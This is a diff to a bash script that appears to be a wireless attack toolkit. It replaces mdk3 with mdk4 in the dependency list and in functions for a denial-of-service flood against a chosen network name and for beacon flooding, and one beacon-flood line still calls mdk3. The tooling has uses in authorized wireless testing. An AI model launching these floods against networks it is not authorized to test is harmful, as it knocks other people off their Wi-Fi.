@@ -40,7 +40,7 @@ fedora=$(echo $?)
 #On the basis of the distribution, download the dependencies 
 programs() {
 	
-	dependencias=(aircrack-ng xterm hashcat git nmap hcxtools php dnsmasq hostapd mdk3 gunzip)
+	dependencias=(aircrack-ng xterm hashcat git nmap hcxtools php dnsmasq hostapd mdk4 gunzip)
 	
 	if [ "$debian" -eq 0 ]; then 
 		clear; tput civis
@@ -498,7 +498,7 @@ dosattack() {
 	dosairdump_PID=$!
 	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid): " && read redos
 	kill -9 $dosairdump_PID; wait $dosairdump_PID 2>/dev/null
-	sudo mdk3 $tar a -e $redos
+	sudo mdk4 $tar a -e $redos
 }
 #[4] Beacon flood attack with mdk
 beaconflood() {
@@ -508,7 +508,7 @@ beaconflood() {
 		echo -ne "${yelloColour}[?]$grayColour Name: " && read nameap
 			xterm -hold -e "sudo mdk3 $tar b -n $nameap -s 1000"
 	elif [ "$rpsbeacon" == "n" ] || [ "$rpsbeacon" == "N" ]; then
-		xterm -hold -e "sudo mdk3 $tar b -s 1000"
+		xterm -hold -e "sudo mdk4 $tar b -s 1000"
 	fi
 	
 }
